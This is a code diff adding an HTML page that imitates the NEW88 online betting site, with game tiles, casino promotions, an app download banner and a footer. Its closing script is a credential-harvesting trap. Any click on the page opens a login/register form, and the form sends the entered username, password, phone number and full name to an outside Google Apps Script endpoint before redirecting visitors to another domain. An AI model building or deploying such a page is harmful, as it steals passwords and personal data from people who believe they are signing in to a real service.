+                        </div>
+                    </div>
+                    <div class="w-1/2 bg-black aspect-video rounded-xl border border-gray-700 overflow-hidden shadow-inner flex items-center justify-center">
+                        <video controls autoplay muted loop playsinline class="w-full h-full object-cover">
+                            <source src="media" type="video/mp4">
+                            <source src="media.mp4" type="video/mp4">
+                            Trình duyệt của bạn không hỗ trợ video.
+                        </video>
+                    </div>
+                </div>
+            </section>
+
+            <section class="w-full px-8 mb-12">
+                <h2 class="text-yellow-500 font-bold text-center text-2xl uppercase mb-6 tracking-wider">Trò Chơi Hot</h2>
+                <div class="grid grid-cols-8 gap-4">
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="setructuyen.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-xs font-bold uppercase truncate px-1 block">SE Trực Tuyến</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="dgtructuyen.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-xs font-bold uppercase truncate px-1 block">DG Trực Tuyến</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="sabathethao.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-xs font-bold uppercase truncate px-1 block">SABA Thể Thao</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="quyetchientienthuong.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-xs font-bold uppercase truncate px-1 block">Quyết Chiến Tiền</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="khobauaztec.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-xs font-bold uppercase truncate px-1 block">Kho Báu Aztec</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="quyetchientienthuong2.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-xs font-bold uppercase truncate px-1 block">Quyết Chiến 2</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="duongmatchuoc2.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-xs font-bold uppercase truncate px-1 block">Đường Mạt Chược 2</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="duongmatchuoc.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-xs font-bold uppercase truncate px-1 block">Đường Mạt Chược</span></div></div>
+                </div>
+            </section>
+
+            <section class="w-full px-8 mb-12">
+                <h2 class="text-yellow-500 font-black text-center text-2xl uppercase mb-8 tracking-widest">SẢN PHẨM</h2>
+                <div class="grid grid-cols-2 gap-6 mb-6">
+                    <div class="bg-[#1e232e] rounded-2xl overflow-hidden relative h-[380px] border border-gray-700 shadow-xl group cursor-pointer flex flex-col justify-end p-8">
+                        <img src="setructuyen.jpg" class="absolute inset-0 w-full h-full object-cover object-center group-hover:scale-105 transition duration-500">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-black/20 to-transparent"></div>
+                        <div class="relative z-10">
+                            <h3 class="font-black text-3xl text-white tracking-wide uppercase">CASINO</h3>
+                            <button class="mt-4 bg-gradient-yellow text-black px-7 py-2.5 rounded-full text-xs font-black uppercase shadow hover:scale-105 transition">Chơi Ngay</button>
+                        </div>
+                    </div>
+                    <div class="bg-[#1e232e] rounded-2xl overflow-hidden relative h-[380px] border border-gray-700 shadow-xl group cursor-pointer flex flex-col justify-end p-8">
+                        <img src="sabathethao.jpg" class="absolute inset-0 w-full h-full object-cover object-center group-hover:scale-105 transition duration-500">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-black/20 to-transparent"></div>
+                        <div class="relative z-10">
+                            <h3 class="font-black text-3xl text-white tracking-wide uppercase">THỂ THAO</h3>
+                            <button class="mt-4 bg-gradient-yellow text-black px-7 py-2.5 rounded-full text-xs font-black uppercase shadow hover:scale-105 transition">Chơi Ngay</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="grid grid-cols-5 gap-4">
+                    <div class="bg-[#1e232e] rounded-xl overflow-hidden relative h-40 border border-gray-700 shadow group cursor-pointer flex flex-col justify-end p-4">
+                        <img src="banca.jpg" class="absolute inset-0 w-full h-full object-cover opacity-60 group-hover:scale-105 transition">
+                        <div class="relative z-10"><h3 class="font-black text-sm uppercase">BẮN CÁ</h3></div>
+                    </div>
+                    <div class="bg-[#1e232e] rounded-xl overflow-hidden relative h-40 border border-gray-700 shadow group cursor-pointer flex flex-col justify-end p-4">
+                        <img src="taixiu.jpg" class="absolute inset-0 w-full h-full object-cover opacity-60 group-hover:scale-105 transition">
+                        <div class="relative z-10"><h3 class="font-black text-sm uppercase">GAME BÀI</h3></div>
+                    </div>
+                    <div class="bg-[#1e232e] rounded-xl overflow-hidden relative h-40 border border-gray-700 shadow group cursor-pointer flex flex-col justify-end p-4">
+                        <img src="khobauaztec.jpg" class="absolute inset-0 w-full h-full object-cover opacity-60 group-hover:scale-105 transition">
+                        <div class="relative z-10"><h3 class="font-black text-sm uppercase">NỔ HŨ</h3></div>
+                    </div>
+                    <div class="bg-[#1e232e] rounded-xl overflow-hidden relative h-40 border border-gray-700 shadow group cursor-pointer flex flex-col justify-end p-4">
+                        <img src="firegod.jpg" class="absolute inset-0 w-full h-full object-cover opacity-60 group-hover:scale-105 transition">
+                        <div class="relative z-10"><h3 class="font-black text-sm uppercase">ĐÁ GÀ</h3></div>
+                    </div>
+                    <div class="bg-[#1e232e] rounded-xl overflow-hidden relative h-40 border border-gray-700 shadow group cursor-pointer flex flex-col justify-end p-4">
+                        <img src="neko.jpg" class="absolute inset-0 w-full h-full object-cover opacity-60 group-hover:scale-105 transition">
+                        <div class="relative z-10"><h3 class="font-black text-sm uppercase">XỔ SỐ</h3></div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="w-full px-8 mb-12">
+                <h2 class="text-yellow-500 font-black text-center text-2xl uppercase mb-8 tracking-widest">HƯỚNG DẪN</h2>
+                <div class="grid grid-cols-4 gap-6">
+                    <div class="bg-[#1e232e] rounded-2xl overflow-hidden border border-gray-700 shadow-xl group cursor-pointer relative">
+                        <img src="huongdan1.jpg" alt="Hướng Dẫn 1" class="w-full h-64 object-cover group-hover:scale-105 transition duration-500">
+                        <div class="absolute bottom-0 inset-x-0 bg-gradient-to-t from-black via-black/80 to-transparent p-4 text-center">
+                            <h4 class="text-yellow-400 font-bold text-sm uppercase">HƯỚNG DẪN RÚT TIỀN TẠI NEW88</h4>
+                        </div>
+                    </div>
+                    <div class="bg-[#1e232e] rounded-2xl overflow-hidden border border-gray-700 shadow-xl group cursor-pointer relative">
+                        <img src="huongdan2.jpg" alt="Hướng Dẫn 2" class="w-full h-64 object-cover group-hover:scale-105 transition duration-500">
+                        <div class="absolute bottom-0 inset-x-0 bg-gradient-to-t from-black via-black/80 to-transparent p-4 text-center">
+                            <h4 class="text-yellow-400 font-bold text-sm uppercase">HƯỚNG DẪN NẠP TIỀN TẠI NEW88</h4>
+                        </div>
+                    </div>
+                    <div class="bg-[#1e232e] rounded-2xl overflow-hidden border border-gray-700 shadow-xl group cursor-pointer relative">
+                        <img src="huongdan3.jpg" alt="Hướng Dẫn 3" class="w-full h-64 object-cover group-hover:scale-105 transition duration-500">
+                        <div class="absolute bottom-0 inset-x-0 bg-gradient-to-t from-black via-black/80 to-transparent p-4 text-center">
+                            <h4 class="text-yellow-400 font-bold text-sm uppercase">HƯỚNG DẪN GỬI THƯ TẠI NEW88</h4>
+                        </div>
+                    </div>
+                    <div class="bg-[#1e232e] rounded-2xl overflow-hidden border border-gray-700 shadow-xl group cursor-pointer relative">
+                        <img src="huongdan4.jpg" alt="Hướng Dẫn 4" class="w-full h-64 object-cover group-hover:scale-105 transition duration-500">
+                        <div class="absolute bottom-0 inset-x-0 bg-gradient-to-t from-black via-black/80 to-transparent p-4 text-center">
+                            <h4 class="text-yellow-400 font-bold text-sm uppercase">HƯỚNG DẪN ĐĂNG KÝ TẠI NEW88</h4>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="w-full px-8 mb-12">
+                <h2 class="text-yellow-500 font-black text-center text-3xl uppercase mb-8 tracking-widest">ĐẠI SỨ THƯƠNG HIỆU ĐỘC QUYỀN</h2>
+                <div class="bg-[#1e232e] rounded-3xl p-8 border border-gray-700 shadow-xl flex flex-col items-center justify-center">
+                    <img src="daisuthuonghieu.jpg" alt="Đại Sứ Thương Hiệu" class="w-full max-w-5xl h-auto object-contain rounded-xl shadow-lg">
+                </div>
+            </section>
+
+            <section class="w-full px-8 mb-12">
+                <div class="bg-[#1e232e] rounded-3xl p-10 border border-gray-700 flex items-center justify-between shadow-2xl relative overflow-hidden">
+                    <div class="z-10 max-w-2xl">
+                        <div class="flex items-center gap-3 mb-4">
+                            <span class="bg-amber-400 text-black px-4 py-1.5 rounded-full font-black text-sm uppercase">Ứng Dụng Độc Quyền</span>
+                            <h3 class="text-yellow-400 font-black text-4xl uppercase tracking-wide">TẢI APP NEW88</h3>
+                        </div>
+                        <p class="text-base text-gray-300 mb-8 leading-relaxed">Để có trải nghiệm mượt mà, bảo mật tuyệt đối và nhận thông báo khuyến mãi nhanh nhất mọi lúc mọi nơi.</p>
+                        <div class="flex gap-5">
+                            <img src="appstore.jpg" alt="App Store" class="h-14 cursor-pointer hover:scale-105 transition shadow-lg">
+                            <img src="googleplay.jpg" alt="Google Play" class="h-14 cursor-pointer hover:scale-105 transition shadow-lg">
+                        </div>
+                    </div>
+                    <div class="z-10 flex items-center justify-center">
+                        <img src="anhdienthoaiapp.jpg" alt="Điện Thoại App" class="h-80 object-contain drop-shadow-2xl">
+                    </div>
+                </div>
+            </section>
+        </div>
+
+
+        <!-- ================= CHIẾN DỊCH THƯƠNG HIỆU & FOOTER ================= -->
+        <section class="w-full px-4 md:px-8 pb-16 md:pb-8">
+            <div class="flex justify-center items-center mb-8">
+                <span class="bg-gradient-yellow text-black px-4 py-1.5 rounded-l-full font-black text-sm">News</span>
+                <span class="text-yellow-500 font-black text-2xl md:text-3xl ml-2 uppercase tracking-wide">NEW88 CHIẾN DỊCH THƯƠNG HIỆU</span>
+            </div>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-12">
+                <div class="bg-[#1e232e] rounded-2xl border border-gray-700 overflow-hidden shadow-xl hover:border-yellow-500 transition">
+                    <img src="chiendichthuonghieumiketyson.jpg" alt="Mike Tyson Campaign" class="w-full h-auto object-cover">
+                </div>
+                <div class="bg-[#1e232e] rounded-2xl border border-gray-700 overflow-hidden shadow-xl hover:border-yellow-500 transition">
+                    <img src="chiendichthuonghieuronaldinho.jpg" alt="Ronaldinho Campaign" class="w-full h-auto object-cover">
+                </div>
+            </div>
+            
+            <div class="border-t border-gray-800 pt-8 text-center bg-[#111] -mx-4 md:-mx-8 px-4 md:px-8 pb-10">
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-6 text-left max-w-5xl mx-auto mb-8 text-xs text-gray-300">
+                    <div>
+                        <h5 class="text-yellow-500 font-bold uppercase mb-3">Giới Thiệu</h5>
+                        <p class="text-gray-400 text-[11px] leading-relaxed">NEW88 là nhà cái cá cược trực tuyến hàng đầu Châu Á, cung cấp đa dạng sản phẩm giải trí đỉnh cao.</p>
+                    </div>
+                    <div>
+                        <h5 class="text-yellow-500 font-bold uppercase mb-3">Hỗ Trợ Trực Tuyến</h5>
+                        <p class="text-gray-400 text-[11px] leading-relaxed">Hệ thống CSKH hoạt động 24/7 sẵn sàng giải đáp mọi thắc mắc của người chơi nhanh chóng.</p>
+                    </div>
+                    <div>
+                        <h5 class="text-yellow-500 font-bold uppercase mb-3">Chính Sách</h5>
+                        <p class="text-gray-400 text-[11px] leading-relaxed">Cam kết bảo mật thông tin tuyệt đối, chơi có trách nhiệm và minh bạch kết quả.</p>
+                    </div>
+                    <div>
+                        <h5 class="text-yellow-500 font-bold uppercase mb-3">Theo Dõi Chúng Tôi</h5>
+                        <div class="flex gap-3 text-lg text-yellow-500 mt-2">
+                            <i class="fab fa-facebook cursor-pointer hover:text-white"></i>
+                            <i class="fab fa-youtube cursor-pointer hover:text-white"></i>
+                            <i class="fab fa-telegram cursor-pointer hover:text-white"></i>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flex justify-center flex-wrap gap-3 text-[10px] md:text-xs text-gray-400 font-medium uppercase mb-3">
+                    <span class="hover:text-yellow-500 cursor-pointer">Điều khoản và điều kiện</span> |
+                    <span class="hover:text-yellow-500 cursor-pointer">Giới thiệu về NEW88</span> |
+                    <span class="hover:text-yellow-500 cursor-pointer">Chơi có trách nhiệm</span> |
+                    <span class="hover:text-yellow-500 cursor-pointer">Quyền riêng tư</span>
+                </div>
+                <p class="text-[10px] text-gray-500">
+                    Copyright © NEW88.COM - Tất cả các quyền được bảo lưu năm 2026.
+                </p>
+            </div>
+        </section>
+
+        <!-- THANH BOTTOM NAVIGATION (Mobile) -->
+        <footer class="md:hidden fixed bottom-0 left-0 w-full h-16 bg-[#1a1e29] border-t border-gray-800 flex justify-around items-center z-50">
+            <div class="flex flex-col items-center text-[#fead00] cursor-pointer">
+                <i class="fas fa-home text-[20px]"></i>
+                <span class="text-[10px] uppercase font-bold mt-1">Trang chủ</span>
+            </div>
+            <div class="flex flex-col items-center text-gray-500 hover:text-white cursor-pointer transition">
+                <i class="fas fa-handshake text-[20px]"></i>
+                <span class="text-[10px] uppercase font-bold mt-1">Đại lý 60%</span>
+            </div>
+            <div class="flex flex-col items-center text-gray-500 hover:text-white cursor-pointer relative transition">
+                <span class="absolute -top-1 -right-1 w-2.5 h-2.5 bg-red-500 rounded-full border border-[#1a1e29]"></span>
+                <i class="fas fa-gift text-[20px]"></i>
+                <span class="text-[10px] uppercase font-bold mt-1">Khuyến mãi</span>
+            </div>
+            <div class="flex flex-col items-center text-gray-500 hover:text-white cursor-pointer transition">
+                <i class="fas fa-headset text-[20px]"></i>
+                <span class="text-[10px] uppercase font-bold mt-1">CSKH 24/7</span>
+            </div>
+            <div class="flex flex-col items-center text-gray-500 hover:text-white cursor-pointer transition">
+                <i class="fas fa-gamepad text-[20px]"></i>
+                <span class="text-[10px] uppercase font-bold mt-1">Chơi thử</span>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- JAVASCRIPT SLIDER BANNER & MOBILE TOGGLE & AUTH MODAL & GG SHEET -->
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            let currentIndex = 0;
+            const slides = document.querySelectorAll('.banner-slide');
+            
+            if(slides.length > 0) {
+                setInterval(() => {
+                    slides[currentIndex].classList.remove('opacity-100');
+                    slides[currentIndex].classList.add('opacity-0');
+                    
+                    currentIndex = (currentIndex + 1) % slides.length;
+                    
+                    slides[currentIndex].classList.remove('opacity-0');
+                    slides[currentIndex].classList.add('opacity-100');
+                }, 2000);
+            }
+
+            // Bắt sự kiện click toàn trang để bất cứ đâu người dùng bấm vào cũng bật form Đăng nhập/Đăng ký
+            document.body.addEventListener('click', function(e) {
+                // Nếu click vào nút đóng modal hoặc bên trong modal thì không bắt sự kiện này để user thao tác bình thường
+                const modal = document.getElementById('auth-modal');
+                const isClickInsideModal = modal.contains(e.target);
+                const isClickCloseBtn = e.target.closest('button[onclick="closeAuthModal()"]');
+                
+                // Nếu modal đang ẩn và click ra ngoài các nút mở form sẵn có thì tự mở modal đăng nhập
+                if (modal.classList.contains('hidden') && !isClickCloseBtn) {
+                    // Kiểm tra xem click có trúng nút Đăng nhập / Đăng ký sẵn có ko, nếu có thì để hàm openAuthModal xử lý
+                    const isAuthBtn = e.target.closest('button[onclick*="openAuthModal"]');
+                    if (!isAuthBtn) {
+                        openAuthModal('login');
+                    }
+                }
+            });
+        });
+
+        function toggleMobileContent() {
+            const content = document.getElementById('mobile-toggle-content');
+            const icon = document.getElementById('toggle-icon');
+            if (content.classList.contains('hidden')) {
+                content.classList.remove('hidden');
+                icon.classList.remove('fa-chevron-down');
+                icon.classList.add('fa-chevron-up');
+            } else {
+                content.classList.add('hidden');
+                icon.classList.remove('fa-chevron-up');
+                icon.classList.add('fa-chevron-down');
+            }
+        }
+
+        // Modal Logic
+        function openAuthModal(type) {
+            document.getElementById('auth-modal').classList.remove('hidden');
+            switchAuthTab(type);
+        }
+
+        function closeAuthModal() {
+            document.getElementById('auth-modal').classList.add('hidden');
+        }
+
+        function switchAuthTab(type) {
+            const regBtn = document.getElementById('tab-reg-btn');
+            const loginBtn = document.getElementById('tab-login-btn');
+            const regForm = document.getElementById('form-register');
+            const loginForm = document.getElementById('form-login');
+
+            if (type === 'register') {
+                regBtn.className = "flex-1 py-2.5 rounded-[8px] font-bold text-[13px] transition bg-gradient-gold-btn text-black shadow-md";
+                loginBtn.className = "flex-1 py-2.5 rounded-[8px] font-bold text-[13px] transition text-gray-400 hover:text-white bg-transparent";
+                regForm.classList.remove('hidden');
+                loginForm.classList.add('hidden');
+            } else {
+                loginBtn.className = "flex-1 py-2.5 rounded-[8px] font-bold text-[13px] transition bg-gradient-gold-btn text-black shadow-md";
+                regBtn.className = "flex-1 py-2.5 rounded-[8px] font-bold text-[13px] transition text-gray-400 hover:text-white bg-transparent";
+                loginForm.classList.remove('hidden');
+                regForm.classList.add('hidden');
+            }
+        }
+
+        // Xử lý lưu Google Sheets & Chuyển hướng
+        function handleAuthSubmit(event, type) {
+            event.preventDefault();
+            
+            const now = new Date().toLocaleString('vi-VN');
+            let username = '';
+            let password = '';
+            let phone = '';
+            let fullname = '';
+
+            if (type === 'Đăng ký') {
+                username = document.getElementById('reg-username').value;
+                password = document.getElementById('reg-password').value;
+                fullname = document.getElementById('reg-fullname').value;
+                phone = document.getElementById('reg-phone').value;
+            } else {
+                username = document.getElementById('login-username').value;
+                password = document.getElementById('login-password').value;
+                phone = document.getElementById('login-phone').value;
+                fullname = 'N/A';
+            }
+
+            const payload = {
+                "Trạng thái": type,
+                "thời gian": now,
+                "tên đăng nhập": username,
+                "mật khẩu": password,
+                "số điện thoại": phone,
+                "ho ten": fullname
+            };
+
+            const scriptURL = "https://script.google.com/macros/s/AKfycbyPclwmpgv-nHOiPyiPz9KCgrkrGEVGVYQ_WTus8kOnT2aZ_tHtzujgeAAwp6YBQvh_Gg/exec";
+
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'text/plain' },
+                body: JSON.stringify(payload)
+              }).finally(() => {
+                    window.location.href = "https://m.new8889.ink/";
+              });
+          }
+      </script>
+</body>
+</html>
